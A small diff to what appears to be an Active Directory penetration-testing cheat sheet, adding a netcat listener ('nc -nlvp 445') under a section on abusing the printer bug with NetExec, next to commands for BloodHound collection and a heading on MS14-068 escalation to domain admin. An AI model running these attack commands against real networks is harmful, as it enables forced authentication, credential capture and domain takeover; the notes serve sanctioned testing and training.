@@ -110,6 +110,7 @@ sudo proxychains4 -f /etc/proxychains4.conf bloodhound-python -ns 10.10.179.140 
 ### Abusing Printer Bug
 ```
 nxc smb ip -u username -p pwd -M printerbug -o LISTENER=ip
+nc -nlvp 445
 ```
 ### Abusing MS14-068 to domain admin
 ```
